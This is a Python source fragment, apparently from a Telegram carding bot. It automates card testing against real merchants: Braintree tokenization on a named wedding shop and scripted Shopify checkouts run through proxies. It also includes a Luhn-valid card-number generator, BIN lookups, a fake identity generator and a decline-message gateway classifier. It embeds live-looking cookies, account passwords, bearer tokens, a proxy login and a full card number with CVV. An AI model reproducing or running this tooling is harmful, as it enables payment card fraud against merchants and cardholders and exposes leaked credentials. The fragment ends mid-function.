_custom_data_email=technotinker2020%40gmail.com; wordpress_test_cookie=WP%20Cookie%20check; nitroCachedPage=0; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.weddingtropics.com%2Fmy-account%2Fadd-payment-method%2F; _ga_Q5TT8N1Z9C=GS1.1.1713432913.1.1.1713433464.0.0.518061027; zps-tgr-dts=sc%3D1-expAppOnNewSession%3D%5B%5D-pc%3D12-sesst%3D1713432912983; _uetsid=f4e5f1f0fd6611eeb8690f845c2d6398|faymm5|2|fl1|0|1569; _uetvid=f4e64940fd6611eea28d2d3b728bed6c|17qcnm6|1713433465463|11|1|bat.bing.com/p/insights/c/h; zsd1713432915439zsrv0.8595092868660772=1713432915439-37-1713433523886; ps_payloadSeqId=165',
    'origin': 'https://www.weddingtropics.com',
    'referer': 'https://www.weddingtropics.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
}

    data = {
    'email': 'sidepickerlol@gmail.com',
    'password': 'Blatinker@1234',
    'wc_order_attribution_source_type': 'referral',
    'wc_order_attribution_referrer': 'https://web.telegram.org/',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': 'web.telegram.org',
    'wc_order_attribution_utm_medium': 'referral',
    'wc_order_attribution_utm_content': '/',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_session_entry': 'https://www.weddingtropics.com/my-account/',
    'wc_order_attribution_session_start_time': '2024-04-18 09:05:12',
    'wc_order_attribution_session_pages': '12',
    'wc_order_attribution_session_count': '1',
    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'woocommerce-register-nonce': '7fa942d056',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'register': 'Register',
}
    response = r.post(
    'https://www.weddingtropics.com/my-account/add-payment-method/',
    headers=headers,
    data=data,
)


    headers2 = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTM1MTk5MjEsImp0aSI6ImZkZGQzMjFhLWM5ZTYtNDFhZS1hYjVmLTAyZDExNDMwMWY2MSIsInN1YiI6ImptNHlod3FodHBjanp6d3YiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImptNHlod3FodHBjanp6d3YiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoid2VkZGluZ3Ryb3BpY3NfaW5zdGFudCJ9fQ.lriScBTxKdjDAnKZ4bsAwgejzyGdilakQPf1UZFo0yPzBxMRNSSVUVUVqfe5Y5rqL_KO6wZ1oIlnut1dtzwmdQ',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://www.weddingtropics.com',
    'referer': 'https://www.weddingtropics.com/',
    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
}

    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '28e129ff-d423-4170-8d89-620ff06502b1',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': '4998710001220227',
                'expirationMonth': '02',
                'expirationYear': '2028',
                'cvv': '983',
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': '',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}


    response = r.post('https://payments.braintree-api.com/graphql', headers=headers2, json=json_data)
    print(response.text)

    cctoken = response.json()['data']['tokenizeCreditCard']['token']

    headers4 = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'zabUserId=1713432912006zabu0.5917773951341629; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-04-18%2009%3A05%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.weddingtropics.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F; sbjs_first_add=fd%3D2024-04-18%2009%3A05%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.weddingtropics.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F; sbjs_current=typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F123.0.0.0%20Safari%2F537.36; zsc9f1c86e1909f411f969988853b26c93d=1713432912977zsc0.742713611512938; zft-sdc=isef%3Dtrue-isfr%3Dtrue-src%3Dweb.telegram.org; _gcl_au=1.1.1779829662.1713432913; _ga=GA1.1.22376554.1713432913; _jsuid=3615473570; _referrer_og=https%3A%2F%2Fweb.telegram.org%2F; FPID=FPID2.2.wMBB0sgMfXZ0gkvFi4VEAxSw6sbtR3sJ6uKVOuCsSbk%3D.1713432913; FPLC=lOi3wxg3KH6LC0GSEyiJPhAcKvNSrO5aj%2FzjrJYPtLSWUzWE8dyqpUXGKEAFUbSzNEqi6oKps1ZAKpeprNXsKdO13NB3IHsQmlvM0Q1WksImiyBq5rUTKbaq2MkvqQ%3D%3D; FPAU=1.1.1779829662.1713432913; _fbp=fb.1.1713432899552.1266071179; zsrqTIfHK9=1713432915439zsrv0.8595092868660772; wordpress_test_cookie=WP%20Cookie%20check; nitroCachedPage=0; wordpress_logged_in_f03950777cbe59ec8ca8be902c16b0e0=sidepickerlol%7C1714643119%7CI5PWA1tH8tDWrjhTcRNptRZJQ5YLxHrtiQggtNBVwhd%7C179e0791c9aa693d50ed7506306324066c2b9aaa46f64ac322286aa4ac5c5755; wfwaf-authcookie-044df84caa71d09100d36698cc830eff=38514%7Cother%7Cread%7C8c1ef8c0ef7f44b6801a4f6fb7de6255bb6ff871920805f5f935232a6d8d9577; _custom_data_username=sidepickerlol; _custom_data_email=sidepickerlol%40gmail.com; sbjs_session=pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.weddingtropics.com%2Fmy-account%2Fadd-payment-method%2F; _ga_Q5TT8N1Z9C=GS1.1.1713432913.1.1.1713434262.0.0.518061027; _first_pageview=1; zps-tgr-dts=sc%3D1-expAppOnNewSession%3D%5B%5D-pc%3D14-sesst%3D1713432912983; _uetsid=f4e5f1f0fd6611eeb8690f845c2d6398|faymm5|2|fl1|0|1569; _uetvid=f4e64940fd6611eea28d2d3b728bed6c|17qcnm6|1713434264406|13|1|bat.bing.com/p/insights/c/h; zsd1713432915439zsrv0.8595092868660772=1713432915439-72-1713434837090; ps_payloadSeqId=319',
    'origin': 'https://www.weddingtropics.com',
    'referer': 'https://www.weddingtropics.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
}

    data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': cctoken,
    'braintree_cc_device_data': '{"device_session_id":"9c05446ea7bfc7871f0035a49305de91","fraud_merchant_id":null,"correlation_id":"746de2f0f139dbbaa16e8601b0a3d632"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/jm4yhwqhtpcjzzwv/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/jm4yhwqhtpcjzzwv"},"merchantId":"jm4yhwqhtpcjzzwv","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"jm4yhwqhtpcjzzwv","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"WeddingTropics","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTM1MjA2NDgsImp0aSI6Ijk4YzVmMzIxLTM1NDItNGVjMi05MWIzLWJkMDE5OTZkMDQ5NSIsInN1YiI6ImptNHlod3FodHBjanp6d3YiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImptNHlod3FodHBjanp6d3YiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.bEfcb_WKJTdGGRe3HBe8SBnaRxsUi2h_W7F1cDC_f4kbXAwAJiJnBy430jNoEiPpGeDKM8tnCzFiG4LsZMayvw","paypalClientId":"AU19DdOx7ZhOMdqYHii1heSXixp6_fl2i_el4yr8s0ZD3_BonNg4_DCeiroO21KfXsNOdz9cz4FyW4eM","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3906482681719710977","accessToken":"access_token$production$jm4yhwqhtpcjzzwv$1c0f435040de05db615487ea713dd025","environment":"production","enrichedCustomerDataEnabled":true},"paypalEnabled":true,"paypal":{"displayName":"WeddingTropics","clientId":"AU19DdOx7ZhOMdqYHii1heSXixp6_fl2i_el4yr8s0ZD3_BonNg4_DCeiroO21KfXsNOdz9cz4FyW4eM","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"weddingtropics_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': '980f7c464f',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

    response5 = r.post(
    'https://www.weddingtropics.com/my-account/add-payment-method/',
    headers=headers4,
    data=data,
)

    print(response5.text)



def ccgenn(bin_number):
    def calculate_checksum(ccn):
        def get_digits(n):
            return [int(d) for d in str(n)]

        digits = get_digits(ccn)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        total = sum(odd_digits)
        for digit in even_digits:
            total += sum(get_digits(digit * 2))
        return total % 10

    def generate_random_digit():
        return random.randint(0, 9)

    def generate_ccn(bin_number):
        ccn = bin_number
        while len(ccn) < 15:
            ccn += str(generate_random_digit())
        checksum = calculate_checksum(ccn + '0')
        ccn += str((10 - checksum) % 10)
        return ccn

    ccns = []
    for _ in range(10):
        ccn = generate_ccn(bin_number)
        expiration_month = str(random.choice(range(1, 13))).zfill(2)
        expiration_year = str(random.choice(range(datetime.date.today().year + 1, datetime.date.today().year + 8)))[-2:]
        cvv = str(random.randrange(1000)).zfill(3)
        ccns.append((ccn, expiration_month, expiration_year, cvv))
    return ccns

def bindat(bin):
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    response = session.get(f"https://bins.antipublic.cc/bins/{bin}", headers=headers)
    data = json.loads(response.text)

    binn = data["bin"]
    brand = data["brand"]
    country = data["country"]
    bank = data["bank"]
    level = data["level"]
    card_type = data["type"]
    flag = data["country_flag"]
    currencies2 = ', '.join(data["country_currencies"])

    return f"✫ 𝗕𝗜𝗡 𝗟𝗢𝗢𝗞𝗨𝗣 ✫ \n---------------------------------\n𝐁𝐈𝐍 : {binn} \n𝐁𝐑𝐀𝐍𝐃 : {brand}\n𝐓𝐘𝐏𝐄 : {card_type} \n𝐋𝐄𝐕𝐄𝐋 : {level}\n𝐁𝐀𝐍𝐊 : {bank} 🏛\n𝐂𝐎𝐔𝐍𝐓𝐑𝐘 : {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"

def generate_fake_info(country_code):
    url = f"https://randomuser.me/api/?nat={country_code}"
    response = requests.get(url)
    data = response.json()

    user = data['results'][0]['name']
    street = data['results'][0]['location']['street']
    city = data['results'][0]['location']['city']
    state = data['results'][0]['location']['state']
    postcode = data['results'][0]['location']['postcode']
    phone = data['results'][0]['phone']
    country = data['results'][0]['location']['country']

    message = f"✫ 𝗙𝗔𝗞𝗘 𝗜𝗡𝗙𝗢 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗢𝗥 ✫\n---------------------------------\n𝗡𝗔𝗠𝗘 : `{user['first']} {user['last']}`\n𝗔𝗱𝗱𝗿𝗲𝘀𝘀 : `{street['number']} {street['name']}`\n𝗖𝗜𝗧𝗬 : `{city}`\n𝗦𝗧𝗔𝗧𝗘 : `{state}`\n𝗣𝗢𝗦𝗧𝗔𝗟 𝗖𝗢𝗗𝗘 : `{postcode}`\n𝗣𝗛𝗢𝗡𝗘 𝗡𝗨𝗠𝗕𝗘𝗥 : `{phone}`\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: `{country}`\n---------------------------------\nBOT BY ⍟ : @LakshayFR"

    return message


def capture(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
      return

def type(msg: str):
    if msg in ["2010 Card Issuer Declined CVV", "2047 Call Issuer. Pick Up Card.", "2007 No Account", "2044 Declined - Call Issuer", "2038 Processor Declined", "2014 Processor Declined - Fraud Suspected", "2000 Do Not Honor", "2001 Insufficient Funds", "2015 Transaction Not Allowed", "2019 Invalid Transaction", "2106 Cannot Authorize at this time (Policy)", "Transaction declined - gateway rejected"] or "Cannot" in msg:
        type = "Shopify + Braintree"
    elif msg == "CVV does not match":
        type = "Shopify + Spreedly"
    elif msg in ["Security codes does not match", "AVS result is declined by user", "Exc App Amt Lmt", "Insuff Funds", "02 Try later", "No Such Issuer", "CVV2 Mismatch", "03 Do not retry", "AVS REJECTED"]:
        type = "Shopify Mix"
    elif msg in ["CVD ERROR                       99048", "AUTH DECLINED                   09001", "*REQUEST DENIED*                99019", "INVALID CARD NO                 99005", "Declined use updated card", "Card declined do not retry", "Information Details", "Declined refer call to issue", "LOST/STOLEN CARD                99016", "HOLD - CALL                     99003"] or "AUTH" in msg:
        type = "Shopify + Moneris"
    elif msg in ["Transaction Normal - Invalid CC Number", "Transaction Normal - Insufficient Funds", "Address not Verified - Insufficient Funds", "Transaction Normal - Suspected Fraud", "Address not Verified - Suspected Fraud", "Address not Verified - Restraint", "Address not Verified - Pickup", "Transaction Normal - Over Limit Frequency", "Address not Verified - Declined", "Transaction Normal - Pickup", "Transaction Normal - Lost/Stolen", "Transaction Normal - Over the limit", "Address not Verified - No Account", "Transaction Normal - Invalid Transaction", "Transaction Normal - Unauthorized User", "Transaction Normal - Account Closed", "Transaction Normal - Declined"]:
        type = "Shopify + Payeezy"
    elif msg in ["CVV2 Mismatch", "Invalid expiration date: 10502-This transaction cannot be processed. Please use a valid credit card.", "Declined: 10541-Please use a different payment card.", "Declined: 15005-This transaction cannot be processed", "Invalid account number: 10535-This transaction cannot be processed. Please enter a valid credit card number and type.", "CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.", "Invalid account number: 10535-This transaction cannot be processed. Please enter a valid credit card number and type.", "Declined: 15005-This transaction cannot be processed.", "Field format error: 12002-This transaction cannot be processed due to either missing, incomplete or invalid 3-D Secure authentication values.", "Declined: 10541-Please use a different payment card."]:
        type = "Shopify +  𝗣𝗔𝗬𝗙𝗟𝗢𝗪 "
    elif msg in ["CVC Declined", "Issuer Suspected Fraud | 59 : Suspected fraud", "Refused", "FRAUD"]:
        type = "Shopify + Adyen"
    elif msg in ["This transaction has been declined", "Street address and postal code do not match.", "No Match"]:
        type = "Shopify Avs"
    elif msg in ["CVV Validation Error  Failed", "Do Not Honour Failed", "Restricted Card Failed", "Suspected Fraud Failed", "Refer to Card Issuer", "Refer To Issuer Failed", "Do Not Honour"]:
        type = "Shopify"
    elif msg in ["Restraint", "Invalid Credit Card Number", "Pickup", "Invalid Institution Code", "Call Voice Center", "Do Not Honor", "Declined call issuer", "Invalid Transaction Type", "Credit Floor", "CVV2/CVC2 Failure"]:
        type = "Shopify + Chasepaymentech"
    elif msg in ["Decline for CVV2 Failure", "Closed Account", "40187 - Verified Info - BIN country in high risk country - Decline", "Security", "Pick Up Card (No Fraud)", "Suspected Fraud", "Insufficient Funds", "40161 - Email velocity - Daily - All transactions - Decline"]:
        type = "Shopify + Chase"
    elif msg in ["40161 - Email velocity - Daily - All transactions - Decline", "40229 - CardHolder Name Velocity - Daily - All transactions - Decline", "40187 - Verified Info - BIN country in high risk country - Decline"]:
        type = "Shopify + Chase Orbital Gateway"
    elif msg in ["Stolen or lost card", "Inactive card or card not authorized for card-not-present transactions", "General decline of the card", "The card has reached the credit limit", "Invalid card verification number", "The authorization request was approved by the issuing bank but declined by CyberSource because it did not pass the AVS check"] or "Cybersource" in msg:
        type = "Shopify + Cybersource"
    elif "/checkouts/c/" in msg:
        type = "Shopify + Stripe"
    else:
        type = "Shopify"
    return type

HEADERS_BASE = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "es,es-ES;q=0.9,en;q=0.8,pt;q=0.7,am;q=0.6",
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
}

async def autoshopify(url: str, card: str, month: str, year: str, cvv: str,):
    ini = perf_counter()

    if not isinstance(url, str):
        raise TypeError("'url' must be an instance of 'str'")
    if not isinstance(card, str):
        raise TypeError("'card' must be an instance of 'str'")
    if not isinstance(month, str):
        raise TypeError("'month' must be an instance of 'str'")
    if not isinstance(year, str):
        raise TypeError("'year' must be an instance of 'str'")
    if not isinstance(cvv, str):
        raise TypeError("'cvv' must be an instance of 'str'")
    result = url_validator(url)

    attempts = 0
    proxies = {
        "http://rp.proxyscrape.com:6060": "http://0vlv3kx7svpm655:rxcvqujk9utaemx@rp.proxyscrape.com:6060",
    }
    while True:
        async with AsyncClient(follow_redirects=True, timeout=40, verify=False, proxies=proxies, headers=HEADERS_BASE) as s:
            try:
                url_request = await s.get(url)

                url_request = str(url_request.url)
                url_parsed = urlparse(url_request)
                url_base = url_parsed.scheme + "://" + url_parsed.netloc
                # 1 REQ - GET PRODUCT ID
                product_id = await get_product_id(f"{url_base}/products.json", s)
                if not product_id and "shoepalace" in str(url_base):
                    product_id = "32645128224814"
                if not product_id:
                    raise Exception("Product ID not found")

                # 2 REQ - Going to checkout and capture the first token
                params = {
                    "traffic_source": "buy_now",
                    "properties": "JTdCJTIyX192ZXJpZmljYXRpb24lMjIlM0ElMjJ2YWxpZCUyMiU3RA==",
                }

                checkout_request = await s.get(f"{url_base}/cart/{product_id}:1", params=params)

                cl = checkout_request.headers.get("Content-Language")
                checkout_text = checkout_request.text

                url_checkout = checkout_request.url

                url_checkout_str = str(url_checkout)
                if "/c/" in url_checkout_str or "/cn/" in url_checkout_str:
                    raise Exception("graphql")

                first_token = generate_random_string(86)

                name = "Sachio" + str(randint(100, 999))
                last = "YT" + str(randint(100, 999)).upper()
                r = str(randint(100, 999))
                street = (r + " W " + r + " nd St ").upper()

                if cl and ("au" in cl or "cc" in cl or "nz" in cl or ".au" in url_base):
                    city = "Sydney"
                    state = "New South Wales"
                    statecode = "NSW"
                    country = "Australia"
                    countrycode = "AU"
                    zip_ = randint(2007, 2020)
                    phone = f"{randint(100, 999)}{randint(100, 999)}{randint(100, 999)}"
                elif cl and ("ca" in cl or ".ca" in url_base):
                    city = "St-Léonard"
                    state = "Quebec"
                    statecode = "QC"
                    country = "Canada"
                    countrycode = "CA"
                    zip_ = "H1S 1N2"
                    phone = f"{randint(100, 999)}{randint(100, 999)}{randint(100, 999)}"
                else:
                    city = "New York"
                    state = "New York"
                    statecode = "NY"
                    country = "United States"
                    countrycode = "US"
                    zip_ = randint(10004, 10033)
                    phone = (f"1{randint(100, 999)}{randint(100, 999)}{randint(100, 999)}")

                city = city.upper()
                state = state.upper()
                country = country.upper()

                # 3 REQ - INFORMATION

                data_ship = {
                    "_method": "patch",
                    "authenticity_token": first_token,
                    "previous_step": "contact_information",
                    "step": "shipping_method",
                    "checkout[email]": fake.email(),
                    "checkout[buyer_accepts_marketing]": "0",
                    "checkout[shipping_address][first_name]": name,
                    "checkout[shipping_address][first_name]": name,
                    "checkout[shipping_address][last_name]": last,
                    "checkout[shipping_address][last_name]": last,
                    "checkout[shipping_address][address1]": street,
                    "checkout[shipping_address][address1]": street,
                    "checkout[shipping_address][address2]": "",
                    "checkout[shipping_address][address2]": "",
                    "checkout[shipping_address][city]": city,
                    "checkout[shipping_address][city]": city,
                    "checkout[shipping_address][country]": countrycode,
                    "checkout[shipping_address][country]": country,
                    "checkout[shipping_address][province]": state,
                    "checkout[shipping_address][province]": statecode,
                    "checkout[shipping_address][zip]": zip_,
                    "checkout[shipping_address][zip]": zip_,
                    "checkout[shipping_address][phone]": phone,
                    "checkout[shipping_address][phone]": phone,
                    "checkout[remember_me]": "",
                    "checkout[remember_me]": 0,
                    "checkout[client_details][browser_width]": "360",
                    "checkout[client_details][browser_height]": "621",
                    "checkout[client_details][javascript_enabled]": "1",
                    "checkout[client_details][color_depth]": "24",
                    "checkout[client_details][java_enabled]": "false",
                    "checkout[client_details][browser_tz]": "300",
                }

                information_request = await s.post(url_checkout, data=data_ship)
                information_response = information_request.text

                await request_shipping_method(s, url_checkout, first_token, information_response)

                # 4 REQ - Going to payment method
                params = {"previous_step": "shipping_method", "step": "payment_method"}
                previous_step_request = await s.get(url_checkout, params=params)
                previous_step_response = previous_step_request.text

                payment_gateway = capture(previous_step_response, 'data-select-gateway="', '"')
                if not payment_gateway:
                    raise Exception("'payment_gateway' not found")
                total_price = capture(previous_step_response, 'data-checkout-payment-due-target="', '"')

                # 5 REQ - SESSION PAY
                json_data = {
                    "credit_card": {
                        "number": card,
                        "name": name,
                        "month": int(month),
                        "year": int(year),
                        "verification_value": cvv,
                    },
                    "payment_session_scope": url_parsed.netloc,
                }

                headers = {
                    "Accept": "application/json",
                    "Accept-Language": "es,es-ES;q=0.9,en;q=0.8,pt;q=0.7,am;q=0.6",
                    "Connection": "keep-alive",
                    "Content-Type": "application/json",
                    "Origin": "https://checkout.shopifycs.com",
                    "Pragma": "no-cache",
                    "Referer": "https://checkout.shopifycs.com/",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
                }

                session_pay_request = await s.post("https://deposit.us.shopifycs.com/sessions", json=json_data, headers=headers)
                session_pay_response = session_pay_request.text

                if not '"id"' in session_pay_response.lower():
                    raise ValueError("Invalid CC")
                session_pay_response = session_pay_request.json()

                s_card = session_pay_response["id"]

                # 6 REQ - PAY REQUEST

                data_pay = {
                    "_method": "patch",
                    "authenticity_token": first_token,
                    "previous_step": "payment_method",
                    "step": "",
                    "s": s_card,
                    "checkout[payment_gateway]": payment_gateway,
                    "checkout[credit_card][vault]": "false",
                    "checkout[different_billing_address]": "false",
                    "checkout[vault_phone]": phone,
                    "checkout[total_price]": total_price,
                    "complete": "1",
                    "checkout[client_details][browser_width]": "360",
                    "checkout[client_details][browser_height]": "621",
                    "checkout[client_details][javascript_enabled]": "1",
                    "checkout[client_details][color_depth]": "24",
                    "checkout[client_details][java_enabled]": "false",
                    "checkout[client_details][browser_tz]": "300",
                }

                pay = await s.post(url_checkout, data=data_pay)
                pay_t = pay.text
                sitekey = capture(pay_t, 'sitekey: "', '"')

                if "I'm not a robot" in pay_t or "reCAPTCHA" in pay_t:
                    try:
                        with open(path_json_keysh, "r") as f:
                            data = json.load(f)
                    except FileNotFoundError:
                        data = {}

                    if sitekey:
                        data.update({url_base: sitekey})

                        with open(path_json_keysh, "w") as f:
                            json.dump(data, f, indent=2)

                await sleep(5)

                # 7 REQ FINAL

                requests_final = await s.get(f"{url_checkout}?from_processing_page=1&validate=true",)
                requests_final_response = requests_final.text

                # REVIEW ORDER
                if "Review order" in requests_final_response:
                    data = {
                        "_method": "patch",
                        "authenticity_token": first_token,
                        "checkout[client_details][browser_width]": "774",
                        "checkout[client_details][browser_height]": "657",
                        "checkout[client_details][javascript_enabled]": "1",
                        "checkout[client_details][color_depth]": "24",
                        "checkout[client_details][java_enabled]": "false",
                        "checkout[client_details][browser_tz]": "360",
                    }
                    await s.post(url_checkout, data=data)
                    session_pay_request = await s.post("https://deposit.us.shopifycs.com/sessions", json=json_data, headers=headers)
                    session_pay_response = session_pay_request.json()

                    s_card = session_pay_response["id"]
                    data_pay["s"] = s_card
                    await s.post(url_checkout, data=data_pay)
                    await sleep(5)
                    requests_final = await s.get(f"{url_checkout}?from_processing_page=1&validate=true")
                    requests_final_response = requests_final.text
                msg = capture(requests_final_response, '<p class="notice__text">', "</p>")
                amt = cd(str(total_price))

                first6 = card[:6]
                response = requests.get(f"https://bins.antipublic.cc/bins/{first6}", headers=headers, proxies=proxies)
                data = json.loads(response.text)
                binn = data.get("bin", "none")
                brand = data.get("brand", "none")
                country = data.get("country", "none")
                bank = data.get("bank", "none")
                level = data.get("level", "none")
                card_type = data.get("type", "none")
                flag = data.get("country_flag", "none")
                currencies2 = ', '.join(data.get("country_currencies", []))

                final = perf_counter() - ini
                gate = type(str(msg))
                card = f"{card}|{month}|{year}|{cvv}"
                site = f"{url_parsed.netloc}"
                gate = f"{gate} ${amt}"
                tme = f"{final:0.3} seconds"
                result = "Good_Shopify"
                return result, site, card, month, year, cvv, gate, tme, binn, brand, bank, level, card_type, flag, currencies2, country, msg
            except Exception as e:
                print("Error occurred:", e)
                traceback.print_exc()
                missing_values = [None] * (15 - 11)
                return (*missing_values, None)
def cd(cents_str):
	try:
		cents = int(cents_str)
		dollars = cents // 100
		remaining_cents = cents % 100
		return f"{dollars}.{remaining_cents:02d}"
	except ValueError:
		return "Invalid input: Please provide a valid number of cents."

async def get_product_id(url: str, session: AsyncClient) -> int | None:
    response = await session.get(url)
    response_data = response.json()

